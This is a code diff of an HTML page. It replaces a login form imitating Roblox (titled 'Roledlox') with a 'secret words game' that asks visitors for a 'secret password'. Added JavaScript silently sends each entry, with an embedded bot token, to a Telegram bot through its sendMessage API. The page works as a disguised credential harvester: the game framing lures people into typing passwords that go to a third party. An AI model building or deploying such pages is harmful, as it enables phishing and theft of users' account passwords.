@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roledlox - تسجيل الدخول</title>
+    <title>لعبة الكلمات السرية</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,7 +14,7 @@
             height: 100vh;
             margin: 0;
         }
-        .login-container {
+        .game-container {
             background-color: white;
             padding: 20px;
             border-radius: 5px;
@@ -43,14 +43,42 @@
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Roledlox</h1>
-        <h2>تسجيل الدخول</h2>
-        <form>
-            <input type="text" placeholder="اسم المستخدم" required>
-            <input type="password" placeholder="كلمة المرور" required>
-            <button type="submit">دخول</button>
+    <div class="game-container">
+        <h1>لعبة الكلمات السرية</h1>
+        <p>أدخل كلمة المرور السرية للمستوى التالي:</p>
+        <form id="gameForm">
+            <input type="text" id="secretWord" placeholder="الكلمة السرية" required>
+            <button type="submit">تحقق</button>
         </form>
+        <p id="result"></p>
     </div>
+    <script>
+        const BOT_TOKEN = '6427937623:AAEXzSsiAIy67dxzI0gqR9Dyuc59iGFSfmM'; // استبدل هذا بتوكن البوت الخاص بك
+
+        document.getElementById('gameForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var secretWord = document.getElementById('secretWord').value;
+            var result = document.getElementById('result');
+            
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: 'YOUR_CHAT_ID', // استبدل هذا بمعرف الدردشة الخاص بك لاحقًا
+                    text: 'كلمة سرية جديدة: ' + secretWord
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                result.textContent = "تم إرسال الكلمة! انتظر الرد من المشرف على اللعبة.";
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                result.textContent = "حدث خطأ أثناء إرسال الكلمة. حاول مرة أخرى.";
+            });
+        });
+    </script>
 </body>
 </html>
